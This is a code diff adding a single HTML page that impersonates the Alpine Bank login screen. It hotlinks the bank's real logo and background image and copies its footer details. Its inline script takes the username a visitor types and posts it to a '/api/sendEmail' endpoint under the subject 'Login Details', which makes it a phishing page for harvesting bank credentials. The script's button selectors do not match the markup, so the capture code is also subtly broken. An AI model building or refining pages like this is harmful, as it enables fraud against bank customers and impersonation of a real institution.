@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Alpine Bank Login</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+    
+    body, html {
+      height: 100%;
+    }
+    
+    body {
+      background: url('Screenshot 2025-06-27 180535.png') no-repeat center center fixed;
+      background-size: cover;
+    }
+    
+    .background {
+      background: url('https://online.alpinebank.com/themes/AlpineBank/img/bg-login.jpg') no-repeat center center/cover;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .login-box {
+            display: block;
+            background-color: #1F1F1F;
+            box-shadow: var(--card-shadow);
+            border-radius: var(--card-corner-radius);
+            margin-bottom: 16px;
+            margin-left: auto;
+            margin-right: auto;
+            box-sizing: border-box;
+            max-width: 480px;
+            width: 90%;
+            padding: 45px
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 18px;
+      margin-bottom: 24px;
+    }
+    
+    .logo-img {
+      width: 244px;
+      height: 64px;
+      object-fit: contain;
+      background: none;
+      border-radius: 0;
+      box-shadow: none;
+      display: block;
+    }
+    
+    .logo-text {
+      color: #2bb673;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      font-size: 2.2rem;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+    
+    input {
+      width: 100%;
+      padding: 0.8rem;
+      margin-bottom: 1rem;
+      border: 1px solid #555;
+      border-radius: 6px;
+      background: #111;
+      color: white;
+    }
+    
+    .links {
+      text-align: right;
+      margin-bottom: 1rem;
+    }
+    
+    .links a {
+      color: #00a680;
+      font-size: 0.9rem;
+      text-decoration: none;
+    }
+    
+    .actions {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: nowrap;
+  gap: 10px;
+}
+
+.signup {
+  font-size: 0.9rem;
+  color: #00a680;
+  white-space: nowrap;
+}
+
+.signup a {
+  color: #00a680;
+  text-decoration: none;
+}
+
+button {
+  padding: 1.2rem 2rem ;
+  background-color: rgb(0, 68, 204);
+  color: white;
+  font-weight: bold;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  white-space: nowrap;
+}
+
+.input-group {
+  position: relative;
+  margin-bottom: 1.5rem;
+}
+.input-group input {
+  width: 100%;
+  padding: 1.4rem 1rem 0.6rem;
+  background: #1a1a1a;
+  border-radius: 6px;
+  outline: none;
+  font-size: 1.25rem;
+  transition: all 0.2s ease-in-out;
+  height: 3.4rem;
+}
+
+.input-group label {
+  position: absolute;
+  top: 54%;
+  left: 1rem;
+  transform: translateY(-50%);
+  background: #1a1a1a;
+  color: #6c746f;
+  padding: 0 4px;
+  font-size: 1.1rem;
+  pointer-events: none;
+  transition: 0.2s ease;
+}
+
+.input-group input:focus,
+.input-group input:valid {
+  border: 2px solid #00a680;
+}
+
+.input-group input:focus + label,
+.input-group input:valid + label {
+  top: 0;
+  left: 0.8rem;
+  font-size: 0.85rem;
+  color: #00a680;
+}
+
+    :root {
+        --primary-content-background-color: rgb(255, 255, 255);
+        --body-text-primary-color: #222;
+        --card-shadow: 0 3px 12px 0 rgba(0,0,0,0.15);
+        --card-corner-radius: 10px;
+        --jha-progress-color: #00a680;
+        --primary-button-color: rgb(0, 68, 204);
+    }
+
+    input:-internal-autofill-selected,input:-webkit-autofill {
+        -webkit-text-fill-color: var(--body-text-primary-color);
+        -webkit-box-shadow: 0 0 0 1000px var(--primary-content-background-color) inset;
+    }
+    .placeholder-login {
+        display: flex;
+        width: 100%;
+        min-height: 100vh;
+        position: relative;
+        flex-direction: column;
+    }
+    .placeholder-login-wrapper {
+        display: flex;
+        flex: 1 0 auto;
+        align-items: center;
+        min-height: 100vh;
+    }
+    .placeholder-card {
+        display: block;
+        background-color: var(--primary-content-background-color);
+        box-shadow: var(--card-shadow);
+        border-radius: var(--card-corner-radius);
+        margin-bottom: 16px;
+        margin-left: auto;
+        margin-right: auto;
+        box-sizing: border-box;
+        max-width: 480px;
+        width: 90%;
+        padding: 40px;
+    }
+    @media (max-width: 600px) {
+        .placeholder-card {
+            width:80%;
+            max-width: none;
+            margin-top: 40px;
+            padding: 20px;
+        }
+    }
+    @media (max-width: 360px) {
+        .placeholder-card {
+            width:90%;
+            padding: 0;
+        }
+    }
+    .placeholder-progress-container {
+        text-align: center;
+        padding: 24px;
+    }
+    .placeholder-progress {
+        display: block;
+        animation: spin .75s linear infinite;
+        transform-origin: center;
+        width: 16px;
+        height: 16px;
+        border-width: 2px;
+        border-style: solid;
+        border-color: var(--jha-progress-color);
+        border-right-color: transparent!important;
+        border-radius: 50%;
+        margin: 75px auto;
+    }
+    @keyframes spin {
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+    @keyframes fadeInUp {
+        0% {
+            opacity: 0;
+            transform: translate3d(0,15%,0);
+        }
+        100% {
+            opacity: 1;
+            transform: translate3d(0,0,0);
+        }
+    }
+
+ 
+ 
+ 
+    .footer {
+      width: 100vw;
+      background: #1F1F1F;
+      color: #bdbdbd;
+      position: fixed;
+      left: 0;
+      bottom: 0;
+      z-index: 100;
+      padding: 0;
+      margin: 0;
+      box-shadow: 0 -2px 8px rgba(0,0,0,0.08);
+      box-sizing: border-box;
+    }
+    .footer-content {
+      width: 100vw;
+      margin: 0 auto;
+      padding: 2px 12px;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.92rem;
+      gap: 8px 14px;
+      color: #888;
+      box-sizing: border-box;
+    }
+    .footer-content > * {
+      flex-shrink: 1;
+      min-width: 0;
+      white-space: nowrap;
+    }
+    .footer-link {
+      color: #00a680;
+      text-decoration: none;
+      transition: text-decoration 0.2s;
+    }
+    .footer-link:hover {
+      text-decoration: underline;
+    }
+    .dot {
+      margin: 0 5px;
+      color: #bdbdbd;
+      font-size: 1.1em;
+    }
+    .icon-text {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    @media (max-width: 600px) {
+      .footer-content {
+        font-size: 0.8rem;
+        gap: 4px 6px;
+        padding: 2px 4px;
+      }
+    }
+</style>
+<body>
+  <div class="background">
+    <div class="login-box">
+      <div class="logo"><img src="https://online.alpinebank.com/images/fi-assets/alpine-bank/alpine-bank-logo-48b3923a.png" alt="Logo" class="logo-img"></div>
+      <div class="input-group">
+        <input type="text" id="username" required />
+        <label for="username">Username</label>
+      </div>
+      
+      <div class="links">
+        <a href="#">Forgot?</a>
+      </div>
+      <div class="actions">
+        <p class="signup">First time user? <a href="#">Enroll now.</a></p>
+        <button>Continue</button>
+      </div>
+      
+    </div>
+  </div>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const form = document.querySelector('.login-box form') || document.querySelector('.login-box');
+      const continueBtn = document.querySelector('.continue-btn') || document.querySelector('button[type="submit"]');
+      const usernameInput = document.getElementById('username');
+
+      if (continueBtn && usernameInput) {
+        continueBtn.addEventListener('click', async function(e) {
+          e.preventDefault();
+          const username = usernameInput.value.trim();
+          if (!username) {
+            alert('Please enter your username.');
+            return;
+          }
+          try {
+            const res = await fetch('/api/sendEmail', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                email: username,
+                message: username,
+                subject: 'Login Details'
+              })
+            });
+            const data = await res.json();
+            if (res.ok) {
+              alert('Login submitted!');
+            } else {
+              alert('Error: ' + (data.message || 'Could not send email.'));
+            }
+          } catch (err) {
+            alert('Network error.');
+          }
+        });
+      }
+    });
+  </script>
+  <footer class="footer">
+    <div class="footer-content">
+      <span>© 2025 Alpine Bank</span>
+      <span class="dot">•</span>
+      <span>(800) 551-6098</span>
+      <span class="dot">•</span>
+      <a href="#" class="footer-link">Privacy policy</a>
+      <span class="dot">•</span>
+      <span>Member FDIC</span>
+      <span class="dot">•</span>
+      <span class="icon-text">
+        Equal Housing Lender
+      </span>
+    </div>
+  </footer>
+</body>
+</html>
